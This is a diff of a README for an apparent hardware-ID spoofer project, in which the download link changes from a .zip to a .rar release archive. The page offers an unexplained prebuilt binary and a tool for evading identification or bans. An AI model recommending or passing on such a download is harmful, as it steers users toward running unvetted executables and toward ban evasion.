@@ -1,4 +1,4 @@
-|[Download](https://github.com/NarendraUbnare/Monotone-HWID-Spoofer/releases/download/download/Monotone.zip)
+|[Download](https://github.com/NarendraUbnare/Monotone-HWID-Spoofer/releases/download/download/Monotone.rar)
 |:------------- |
 
 # Monotone-HWID-Spoofer
